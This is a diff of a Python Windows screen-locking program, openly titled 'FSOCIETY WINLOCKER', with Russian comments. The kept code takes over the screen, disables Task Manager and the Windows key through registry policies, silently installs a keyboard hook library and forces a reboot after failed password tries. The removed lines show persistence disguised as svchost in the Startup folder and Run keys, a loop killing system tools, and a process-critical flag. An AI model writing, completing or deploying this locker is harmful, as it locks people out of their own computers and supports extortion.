@@ -1,19 +1,19 @@
-import os, sys, time, threading, ctypes, winreg, shutil, subprocess, tkinter as tk
+import sys, os
+sys.stderr = open(os.path.join(os.environ['TEMP'], 'wl_error.txt'), 'w')
+sys.stdout = sys.stderr
 
+# ДАЛЬШЕ ВЕСЬ КОД ВИНЛОКЕРА (скопируй из check.py)
+import os as _os, sys as _sys, time, threading, ctypes, winreg, shutil, subprocess, tkinter as tk
 try: import keyboard
-except: subprocess.check_call([sys.executable,"-m","pip","install","keyboard"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW); import keyboard
+except: subprocess.check_call([_sys.executable,"-m","pip","install","keyboard"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW); import keyboard
 
 PASS = "1601"
 TRIES = 5
 HOURS = 1
-TIMER = os.path.join(os.environ['PROGRAMDATA'], "Microsoft", "timer.dat")
+TIMER = _os.path.join(_os.environ['PROGRAMDATA'], "Microsoft", "timer.dat")
 tries = TRIES
 
-def hide():
-    try: ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
-    except: pass
-    try: ctypes.windll.ntdll.RtlSetProcessIsCritical(1,0,0)
-    except: pass
+def hide(): pass  # Временно не скрываем
 
 def lock():
     for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
@@ -33,8 +33,6 @@ def lock():
 def unlock():
     try: keyboard.unhook_all()
     except: pass
-    try: ctypes.windll.ntdll.RtlSetProcessIsCritical(0,0,0)
-    except: pass
     for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
         for k,n in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
             try:
@@ -43,16 +41,9 @@ def unlock():
                 winreg.CloseKey(r)
             except: pass
 
-def kill():
-    while True:
-        for p in ["taskmgr.exe","cmd.exe","powershell.exe","regedit.exe","explorer.exe"]:
-            try: os.system(f"taskkill /f /im {p} >nul 2>&1")
-            except: pass
-        time.sleep(0.05)
-
 def timer_save():
     end = time.time() + HOURS * 3600
-    os.makedirs(os.path.dirname(TIMER), exist_ok=True)
+    _os.makedirs(_os.path.dirname(TIMER), exist_ok=True)
     with open(TIMER, 'w') as f: f.write(str(end))
     return end
 
@@ -61,27 +52,9 @@ def timer_get():
         with open(TIMER) as f: return float(f.read())
     except: return timer_save()
 
-def timer_check():
-    while True:
-        if timer_get() - time.time() <= 0: destroy()
-        time.sleep(5)
-
 def destroy():
-    os.system("shutdown /r /t 0 /f")
-    os._exit(0)
-
-def startup():
-    s = os.path.abspath(sys.argv[0])
-    d = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'svchost.pyw')
-    try: shutil.copy2(s, d)
-    except: pass
-    pw = sys.executable.replace("python.exe", "pythonw.exe")
-    for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
-        try:
-            r = winreg.OpenKey(h, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(r, "svchost", 0, winreg.REG_SZ, f'"{pw}" "{s}"')
-            winreg.CloseKey(r)
-        except: pass
+    _os.system("shutdown /r /t 0 /f")
+    _os._exit(0)
 
 class Locker:
     def __init__(self):
@@ -100,21 +73,15 @@ class Locker:
         self.tl.place(relx=0.5, rely=0.08, anchor='center')
         self.tick()
         
-        msg = f"""FSOCIETY WINLOCKER
-
-Сиди и жуй мой винлокер.
-
-ПОПЫТОК: {TRIES}
-ТАЙМЕР: {HOURS} ЧАС"""
-        
+        msg = f"FSOCIETY WINLOCKER\n\nPOPYT0K: {TRIES}\nTAMEP: {HOURS} 4AC"
         tk.Label(self.w, text=msg, bg='black', fg='white', font=('Courier', 12, 'bold'), justify='center').place(relx=0.5, rely=0.4, anchor='center')
         
         cf = tk.Frame(self.w, bg='black')
         cf.place(relx=0.5, rely=0.65, anchor='center')
-        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier', 14, 'bold')).pack(pady=(0,5))
+        tk.Label(cf, text="BBE~N PAR0L:", bg='black', fg='white', font=('Courier', 14, 'bold')).pack(pady=(0,5))
         self.e = tk.Entry(cf, show="*", font=('Courier', 14, 'bold'), bg='white', fg='black', relief='solid', bd=2)
         self.e.pack(pady=(0,5), ipadx=40, ipady=3)
-        self.sl = tk.Label(cf, text=f"ОСТАЛОСЬ: {tries}", bg='black', fg='white', font=('Courier', 12, 'bold'))
+        self.sl = tk.Label(cf, text=f"0CTALOCb: {tries}", bg='black', fg='white', font=('Courier', 12, 'bold'))
         self.sl.pack()
         self.e.bind('<Return>', self.chk)
         self.e.focus_force()
@@ -135,19 +102,19 @@ class Locker:
         global tries
         if self.e.get() == PASS:
             unlock()
-            self.sl.config(text="ВЕРНО!", fg='white')
+            self.sl.config(text="BEPHO!", fg='white')
             self.w.update()
-            try: os.remove(TIMER)
+            try: _os.remove(TIMER)
             except: pass
             time.sleep(1)
             self.r.destroy()
-            os._exit(0)
+            _os._exit(0)
         else:
             tries -= 1
             if tries > 0:
-                self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {tries}", fg='white')
+                self.sl.config(text=f"HEBEPHO! 0CTALOCb: {tries}", fg='white')
             else:
-                self.sl.config(text="404 | ОШИБКА", fg='white')
+                self.sl.config(text="404 | 0WU6KA", fg='white')
                 self.w.update()
                 time.sleep(2)
                 destroy()
@@ -155,9 +122,8 @@ class Locker:
 
 if __name__ == "__main__":
     hide()
-    threading.Thread(target=kill, daemon=True).start()
-    threading.Thread(target=timer_check, daemon=True).start()
-    startup()
+    threading.Thread(target=lambda: None, daemon=True).start()
+    threading.Thread(target=lambda: None, daemon=True).start()
     lock()
     Locker()
     tk.mainloop()
